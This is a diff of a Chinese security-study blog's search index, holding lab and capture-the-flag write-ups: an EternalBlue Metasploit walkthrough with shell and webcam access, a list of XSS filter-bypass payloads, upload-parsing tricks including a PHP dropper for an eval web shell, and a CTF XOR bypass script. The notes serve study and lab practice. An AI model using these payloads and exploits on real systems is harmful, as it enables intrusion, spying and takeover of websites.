@@ -133,6 +133,18 @@
       </tags>
   </entry>
   <entry>
+    <title>SSRF</title>
+    <url>/2022/04/04/SSRF/</url>
+    <content><![CDATA[<h1 id="一、什么是SSRF"><a href="#一、什么是SSRF" class="headerlink" title="一、什么是SSRF"></a>一、什么是SSRF</h1><p>SSRF（server-side request forgery，服务端请求伪造），这是一个由攻击者构造请求，服务器发起请求的安全漏洞，就是让服务器去请求你通常请求不到的东西</p>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>桥接模式、NAT模式和仅主机模式</title>
     <url>/2022/10/07/VMnet/</url>
     <content><![CDATA[<h1 id="一、VMware网络"><a href="#一、VMware网络" class="headerlink" title="一、VMware网络"></a>一、VMware网络</h1><p>在我们安装 VMware 虚拟机后，在 PC 网络连接中会多出两个虚拟网卡：</p>
@@ -163,18 +175,6 @@
       <tags>
         <tag>VMware</tag>
         <tag>learn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSRF</title>
-    <url>/2022/04/04/SSRF/</url>
-    <content><![CDATA[<h1 id="一、什么是SSRF"><a href="#一、什么是SSRF" class="headerlink" title="一、什么是SSRF"></a>一、什么是SSRF</h1><p>SSRF（server-side request forgery，服务端请求伪造），这是一个由攻击者构造请求，服务器发起请求的安全漏洞，就是让服务器去请求你通常请求不到的东西</p>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1714,6 +1714,58 @@
       </tags>
   </entry>
   <entry>
+    <title>永恒之蓝复现</title>
+    <url>/2022/04/12/ms17-010/</url>
+    <content><![CDATA[<h1 id="一、搭建测试环境"><a href="#一、搭建测试环境" class="headerlink" title="一、搭建测试环境"></a>一、搭建测试环境</h1><p>两台虚拟机</p>
+<ul>
+<li>kali linux（攻击机）ip：192.168.11.132</li>
+<li>Windows 7（被攻击机）ip：192.168.11.128</li>
+</ul>
+<p>tips：被攻击机防火墙需要关闭否则会对实验造成影响</p>
+<h1 id="二、扫描端口"><a href="#二、扫描端口" class="headerlink" title="二、扫描端口"></a>二、扫描端口</h1><p>使用nmap扫描端口查看是否开放445端口</p>
+<p><code>nmap 192.168.11.128</code></p>
+<p><img src="/2022/04/12/ms17-010/1.png" alt></p>
+<p>发现445端口开放</p>
+<h1 id="三、使用Metasploit工具"><a href="#三、使用Metasploit工具" class="headerlink" title="三、使用Metasploit工具"></a>三、使用Metasploit工具</h1><p><strong>msf（Metasploit）</strong>是一个开源的工具，它常常应用于渗透测试方面，它里面六个模块分别为<strong>辅助模块（auxiliary）</strong>、<strong>渗透攻击模块（exploits）</strong>、<strong>后渗透攻击模块（post）</strong>、<strong>攻击载荷模（payloads）</strong>、<strong>空指令模块（nops）</strong>、<strong>编码器模块（encoders）</strong>。它里面含有2000多种漏洞库存，用于测试</p>
+<p>使用<code>msfconsole</code>进入该工具，然后使用<code>search ms17-010</code>寻找所需模块</p>
+<p><img src="/2022/04/12/ms17-010/2.png" alt></p>
+<h2 id="1、检验是否有漏洞"><a href="#1、检验是否有漏洞" class="headerlink" title="1、检验是否有漏洞"></a>1、检验是否有漏洞</h2><p>使用<code>auxiliary</code>模块验证是否有永恒之蓝漏洞：<code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
+<p><code>show options</code>可以查看需要配置的东西</p>
+<p><img src="/2022/04/12/ms17-010/3.png" alt></p>
+<ol>
+<li>配置ip：<code>set RHOSTS 192.168.11.128</code></li>
+<li>配置端口：<code>set RPORT 445</code></li>
+</ol>
+<p><img src="/2022/04/12/ms17-010/4.png" alt></p>
+<p>配置好之后<code>run</code>即可</p>
+<p><img src="/2022/04/12/ms17-010/5.png" alt></p>
+<p>可以看到它检测出来这个ip有永恒之蓝漏洞</p>
+<h2 id="2、攻击"><a href="#2、攻击" class="headerlink" title="2、攻击"></a>2、攻击</h2><p>使用<code>exploit</code>模块进行攻击：<code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
+<p><code>show options</code>查看需要配置的内容</p>
+<p>同理，配置好ip和端口即可</p>
+<p>然后<code>run</code>即可，出现下面这种就代表成功</p>
+<p><img src="/2022/04/12/ms17-010/6.png" alt></p>
+<h2 id="3、利用"><a href="#3、利用" class="headerlink" title="3、利用"></a>3、利用</h2><ol>
+<li>使用<code>screenshot</code>可以截屏</li>
+<li>使用<code>shell</code>可以进入被攻击机的Windows shell</li>
+<li>使用<code>webcam_snap</code>可以使用摄像头拍照</li>
+<li><code>exit</code>退出</li>
+<li>…</li>
+</ol>
+<p>但在使用Windows shell的时候会发现有乱码</p>
+<p><img src="/2022/04/12/ms17-010/7.png" alt></p>
+<p>使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页），这样就显示正常了</p>
+<p>既然都能使用Windows shell了，那就什么事都不在话下了</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>metasploit</title>
     <url>/2022/04/24/metasploit/</url>
     <content><![CDATA[<h1 id="一、metasploit框架介绍"><a href="#一、metasploit框架介绍" class="headerlink" title="一、metasploit框架介绍"></a>一、metasploit框架介绍</h1><blockquote>
@@ -1823,58 +1875,6 @@
       <tags>
         <tag>web</tag>
         <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>永恒之蓝复现</title>
-    <url>/2022/04/12/ms17-010/</url>
-    <content><![CDATA[<h1 id="一、搭建测试环境"><a href="#一、搭建测试环境" class="headerlink" title="一、搭建测试环境"></a>一、搭建测试环境</h1><p>两台虚拟机</p>
-<ul>
-<li>kali linux（攻击机）ip：192.168.11.132</li>
-<li>Windows 7（被攻击机）ip：192.168.11.128</li>
-</ul>
-<p>tips：被攻击机防火墙需要关闭否则会对实验造成影响</p>
-<h1 id="二、扫描端口"><a href="#二、扫描端口" class="headerlink" title="二、扫描端口"></a>二、扫描端口</h1><p>使用nmap扫描端口查看是否开放445端口</p>
-<p><code>nmap 192.168.11.128</code></p>
-<p><img src="/2022/04/12/ms17-010/1.png" alt></p>
-<p>发现445端口开放</p>
-<h1 id="三、使用Metasploit工具"><a href="#三、使用Metasploit工具" class="headerlink" title="三、使用Metasploit工具"></a>三、使用Metasploit工具</h1><p><strong>msf（Metasploit）</strong>是一个开源的工具，它常常应用于渗透测试方面，它里面六个模块分别为<strong>辅助模块（auxiliary）</strong>、<strong>渗透攻击模块（exploits）</strong>、<strong>后渗透攻击模块（post）</strong>、<strong>攻击载荷模（payloads）</strong>、<strong>空指令模块（nops）</strong>、<strong>编码器模块（encoders）</strong>。它里面含有2000多种漏洞库存，用于测试</p>
-<p>使用<code>msfconsole</code>进入该工具，然后使用<code>search ms17-010</code>寻找所需模块</p>
-<p><img src="/2022/04/12/ms17-010/2.png" alt></p>
-<h2 id="1、检验是否有漏洞"><a href="#1、检验是否有漏洞" class="headerlink" title="1、检验是否有漏洞"></a>1、检验是否有漏洞</h2><p>使用<code>auxiliary</code>模块验证是否有永恒之蓝漏洞：<code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
-<p><code>show options</code>可以查看需要配置的东西</p>
-<p><img src="/2022/04/12/ms17-010/3.png" alt></p>
-<ol>
-<li>配置ip：<code>set RHOSTS 192.168.11.128</code></li>
-<li>配置端口：<code>set RPORT 445</code></li>
-</ol>
-<p><img src="/2022/04/12/ms17-010/4.png" alt></p>
-<p>配置好之后<code>run</code>即可</p>
-<p><img src="/2022/04/12/ms17-010/5.png" alt></p>
-<p>可以看到它检测出来这个ip有永恒之蓝漏洞</p>
-<h2 id="2、攻击"><a href="#2、攻击" class="headerlink" title="2、攻击"></a>2、攻击</h2><p>使用<code>exploit</code>模块进行攻击：<code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
-<p><code>show options</code>查看需要配置的内容</p>
-<p>同理，配置好ip和端口即可</p>
-<p>然后<code>run</code>即可，出现下面这种就代表成功</p>
-<p><img src="/2022/04/12/ms17-010/6.png" alt></p>
-<h2 id="3、利用"><a href="#3、利用" class="headerlink" title="3、利用"></a>3、利用</h2><ol>
-<li>使用<code>screenshot</code>可以截屏</li>
-<li>使用<code>shell</code>可以进入被攻击机的Windows shell</li>
-<li>使用<code>webcam_snap</code>可以使用摄像头拍照</li>
-<li><code>exit</code>退出</li>
-<li>…</li>
-</ol>
-<p>但在使用Windows shell的时候会发现有乱码</p>
-<p><img src="/2022/04/12/ms17-010/7.png" alt></p>
-<p>使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页），这样就显示正常了</p>
-<p>既然都能使用Windows shell了，那就什么事都不在话下了</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>复现</tag>
       </tags>
   </entry>
   <entry>
@@ -2452,6 +2452,19 @@
       </tags>
   </entry>
   <entry>
+    <title>git clone出错</title>
+    <url>/2022/01/09/study-1/</url>
+    <content><![CDATA[<h4 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> http.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> https.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br></pre></td></tr></table></figure>
+<h4 id="如果无效则输入："><a href="#如果无效则输入：" class="headerlink" title="如果无效则输入："></a>如果无效则输入：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> --unset http.proxy</span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> --unset https.proxy</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>基础知识和笔记</category>
+      </categories>
+      <tags>
+        <tag>learn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NTFS权限</title>
     <url>/2022/01/09/study-2/</url>
     <content><![CDATA[<h1 id="0x01-NTFS权限概述"><a href="#0x01-NTFS权限概述" class="headerlink" title="0x01 NTFS权限概述"></a>0x01 NTFS权限概述</h1><ol>
@@ -2568,19 +2581,6 @@
 <p>方法：文件夹右键属性—安全—高级—勾上第二个对号即可</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">案例：</span><br><span class="line">123文件夹下有许多个子文件夹及文件，由于长时间的权限管理，多个子文件夹的权限都做过不同的权限修改，现需要该文件夹下的所有子文件夹及子文件的权限全部统一</span><br></pre></td></tr></table></figure>
 <h3 id="4-7-文件复制对权限的影响"><a href="#4-7-文件复制对权限的影响" class="headerlink" title="4.7 文件复制对权限的影响"></a>4.7 文件复制对权限的影响</h3><p>文件复制后，文件的权限被目标文件夹的权限覆盖</p>
-]]></content>
-      <categories>
-        <category>基础知识和笔记</category>
-      </categories>
-      <tags>
-        <tag>learn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>git clone出错</title>
-    <url>/2022/01/09/study-1/</url>
-    <content><![CDATA[<h4 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> http.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> https.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br></pre></td></tr></table></figure>
-<h4 id="如果无效则输入："><a href="#如果无效则输入：" class="headerlink" title="如果无效则输入："></a>如果无效则输入：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> --unset http.proxy</span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> --unset https.proxy</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>基础知识和笔记</category>
@@ -2795,6 +2795,160 @@
       </tags>
   </entry>
   <entry>
+    <title>XSS各种绕过姿势</title>
+    <url>/2022/03/19/xss/</url>
+    <content><![CDATA[<h1 id="0x01-分类"><a href="#0x01-分类" class="headerlink" title="0x01 分类"></a>0x01 分类</h1><h2 id="1、反射型"><a href="#1、反射型" class="headerlink" title="1、反射型"></a>1、反射型</h2><p>也分为GET和POST两种，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p>
+<h2 id="2、存储型"><a href="#2、存储型" class="headerlink" title="2、存储型"></a>2、存储型</h2><p>持久化，代码是存储在服务器中的，如在个人信息、发表文章、发表评论等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。</p>
+<h2 id="3、DOM型"><a href="#3、DOM型" class="headerlink" title="3、DOM型"></a>3、DOM型</h2><p>不经过后端，基于文档对象模型的一种漏洞，它是通过url传入参数去控制触发的，其实也属于反射型。</p>
+<h1 id="0x02-绕过方法"><a href="#0x02-绕过方法" class="headerlink" title="0x02 绕过方法"></a>0x02 绕过方法</h1><h2 id="一、过滤关键字"><a href="#一、过滤关键字" class="headerlink" title="一、过滤关键字"></a>一、过滤关键字</h2><h3 id="1-1-大小写绕过"><a href="#1-1-大小写绕过" class="headerlink" title="1.1 大小写绕过"></a>1.1 大小写绕过</h3><p><code>&lt;a Href=&quot;JavasCript:aLert(&#39;xss&#39;)&quot;&gt;</code></p>
+<h3 id="1-2-双写关键字绕过"><a href="#1-2-双写关键字绕过" class="headerlink" title="1.2 双写关键字绕过"></a>1.2 双写关键字绕过</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过：</p>
+<p><code>&lt;a hhrefref=&quot;javascripscriptt:alert(&#39;xss&#39;)&quot;&gt;</code></p>
+<h3 id="1-3-字符串拼接"><a href="#1-3-字符串拼接" class="headerlink" title="1.3 字符串拼接"></a>1.3 字符串拼接</h3><ol>
+<li><p>通过利用eval函数：</p>
+<p><code>&lt;a href=&quot;a=&#39;javascri&#39;;b=&#39;pt:aler&#39;;c=&#39;t&#39;;d=&#39;(&#39;xss&#39;)&#39;;eval(a+b+c+d)&quot;&gt;</code></p>
+</li>
+<li><p>通过利用top函数：</p>
+<p><code>&lt;script&gt;top[&quot;ale&quot;+&quot;rt&quot;](&#39;xss&#39;)&lt;/script&gt;</code></p>
+</li>
+</ol>
+<h3 id="1-4-使用注释进行干扰绕过"><a href="#1-4-使用注释进行干扰绕过" class="headerlink" title="1.4 使用注释进行干扰绕过"></a>1.4 使用注释进行干扰绕过</h3><p><code>&lt;scri&lt;!--aaa--&gt;pt&gt;alert(123)&lt;/scri&lt;!--bbb--&gt;pt&gt;</code></p>
+<h3 id="1-5-编码绕过"><a href="#1-5-编码绕过" class="headerlink" title="1.5 编码绕过"></a>1.5 编码绕过</h3><ol>
+<li><p>Unicode编码绕过</p>
+<p><code>&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&quot;&gt;</code></p>
+<p><code>&lt;a href=&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029&quot;&gt;</code></p>
+</li>
+<li><p>url编码绕过</p>
+<p><code>&lt;a href=&quot;%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%78%73%73%27%29&quot;&gt;</code></p>
+</li>
+<li><p>Ascii码绕过</p>
+<p><code>&lt;a href=&quot;&quot;&gt;</code></p>
+</li>
+</ol>
+<h2 id="三、HttpOnly"><a href="#三、HttpOnly" class="headerlink" title="三、HttpOnly"></a>三、HttpOnly</h2><p>HttpOnly是Set-Cookie HTTP响应头中包含的<em>附加标志</em>，开启后如果检测到检测到包含HttpOnly标志的cookie，并且客户端脚本代码尝试读取cookie，则浏览器会返回一个空字符作为结果。这样可以防止恶意（通常是XSS）代码将数据发送到攻击者的网站，从而导致攻击失败。</p>
+<h3 id="3-1、绕过方法"><a href="#3-1、绕过方法" class="headerlink" title="3.1、绕过方法"></a>3.1、绕过方法</h3><ol>
+<li>浏览器未保存账号密码，需要xss产生登录地址，利用表单劫持</li>
+<li>浏览器保存密码，产生在后台的xss，存储型xss如留言等，浏览器读取账号密码</li>
+</ol>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解析漏洞</title>
+    <url>/2022/01/09/upload/</url>
+    <content><![CDATA[<h1 id="0x01-IIS5-x-6-0解析漏洞"><a href="#0x01-IIS5-x-6-0解析漏洞" class="headerlink" title="0x01 IIS5.x/6.0解析漏洞"></a>0x01 IIS5.x/6.0解析漏洞</h1><p>IIS6.0解析利用的方法有两种：</p>
+<ol>
+<li><p><strong>目录解析</strong></p>
+<p>在网站下建立文件夹名字为.<strong>asp</strong>、.<strong>asa</strong>的文件夹，其目录内的任何扩展名的文件都别IIS当作asp文件来解析并执行。例如创建目录<strong>pamela.asp</strong>，那么<strong>pamela.asp / 1.jpg</strong>将被当作asp文件来执行。</p>
+</li>
+<li><p><strong>文件解析</strong></p>
+<p>在IIS6.0下，分号后面的不被解析，也就是说pamela.asp;.jpg会被服务器看成是pamela.asp，还有        IIS6.0默认的可执行文件除了asp还包括这三种:</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pamela.asa</span><br><span class="line">pamela.cer</span><br><span class="line">pamela.cdx</span><br></pre></td></tr></table></figure>
+<h1 id="0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞"></a>0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞</h1><p>在默认Fast-CGI开启状况下，上传一个名字为<strong>pamela.jpg</strong>，内容为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval(&amp;_POST[cmd])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>的文件，然后访问<strong>pamela.jpg/.php</strong>，在这个目录下就会生成一句话木马<strong>shell.php</strong></p>
+<h1 id="0x03-Nginx-lt-8-03空字节代码执行漏洞"><a href="#0x03-Nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="0x03 Nginx&lt;8.03空字节代码执行漏洞"></a>0x03 Nginx&lt;8.03空字节代码执行漏洞</h1><ol>
+<li><p><strong>影响版本</strong>:</p>
+<p>0.5./0.6./0.7&lt;=0.7.65/0.8&lt;=0.8.37</p>
+</li>
+<li><p><strong>简介</strong></p>
+<p>Nginx在图片中嵌入php代码然后通过访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx.jpg%00.php</span><br></pre></td></tr></table></figure>
+<p>来执行其中的代码</p>
+</li>
+</ol>
+<h1 id="0x04-Apache解析漏洞"><a href="#0x04-Apache解析漏洞" class="headerlink" title="0x04 Apache解析漏洞"></a>0x04 Apache解析漏洞</h1><ol>
+<li><p><strong>背景</strong></p>
+<p>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p>
+</li>
+<li><p><strong>简介</strong></p>
+<p>比如<strong>pamela.php.owf.rar</strong> “<strong>.owf</strong>”和”<strong>.rar</strong>” 这两种后缀是 apache 不可识别解析,apache就会把<strong>pamela.php.owf.rar</strong>解析成 <strong>.php</strong></p>
+</li>
+<li><p><strong>利用</strong></p>
+<p>如何判断是不是合法的后缀就是这个漏洞的利用关键,<strong>pamela.php.rara.jpg.png…</strong>（把你知道的常见后缀都写上）去测试是否是合法后缀</p>
+</li>
+</ol>
+<h1 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h1><ol>
+<li><p>在Windows环境下，<strong>xx.jpg[空格]或xx.jpg</strong> 这两类文件是不允许存在的，若这样命名，Windows会默认去除空格和点，我们可以通过抓包，在文件名后加一个<strong>空格或者点</strong>来绕过黑名单，若上传成功，空格和点都会被Windows自动消除，这样也可以getshell</p>
+</li>
+<li><p>如果在apache中 <strong>.htaccess</strong>可被执行，且可被上传，那可以尝试在 .htaccess中写入：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">cimer</span>&quot;&gt;</span> </span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后再上传shell.jpg的木马，这样shell.jpg就可解析为php文件</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>传输文件还原</title>
+    <url>/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/</url>
+    <content><![CDATA[<h1 id="一、配置环境"><a href="#一、配置环境" class="headerlink" title="一、配置环境"></a>一、配置环境</h1><p>将手机和PC连到同一子网下（如GUET-WiFi）</p>
+<p>手机IP：<code>10.33.80.238</code></p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/1.png" alt></p>
+<p>PC的IP：<code>10.33.35.83</code></p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/2.png" alt></p>
+<h1 id="二、WireShark抓包"><a href="#二、WireShark抓包" class="headerlink" title="二、WireShark抓包"></a>二、WireShark抓包</h1><p>打开WireShark，选择WLAN过滤器</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/3.png" alt></p>
+<p>然后在过滤出resource IP是手机IP的数据包：<code>ip.src == 10.33.80.238</code></p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/4.png" alt></p>
+<p>通过QQ从手机发送一张图片给PC，此时WireShark会截获大量数据包，找到其中一个是HTTP协议的数据包</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/5.png" alt></p>
+<p>右键单击然后选择追踪TCP流</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/6.png" alt></p>
+<p>然后在下面展示数据的格式中选择原始数据（raw data）</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/7.png" alt></p>
+<p>然后将这些原始数据另存为一个新文件即可</p>
+<h1 id="三、还原文件"><a href="#三、还原文件" class="headerlink" title="三、还原文件"></a>三、还原文件</h1><p>用十六进制编辑器（010 Editor）打开该文件，找到图片的十六进制文件头（FFD8FF）</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/8.png" alt></p>
+<p>然后删除该文件头之前的所有数据</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/9.png" alt></p>
+<p>然后保存，修改文件后缀名为图片格式（jpg）即可成功打开该图片</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/10.png" alt></p>
+]]></content>
+      <categories>
+        <category>基础知识和笔记</category>
+      </categories>
+      <tags>
+        <tag>learn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2021 GUET梦极光杯</title>
+    <url>/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<p>有一道web题，源码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[A-Za-z0-9;()]/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo &quot;</span> . <span class="variable">$code</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_clean();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> === <span class="string">&quot;guetctf&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很明显可以看到我们要构造 <strong>‘ code=guetctf ’</strong> 才能解开，但是正则表达式把所有的字母和数字都过滤掉了，因此我们要通过其他方法来进行绕过</p>
+<h3 id="一、异或"><a href="#一、异或" class="headerlink" title="一、异或"></a>一、异或</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[A-Za-z0-9;()]/i&#x27;</span>; <span class="comment">//可以根据题目给的正则表达式进行修改</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)^urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
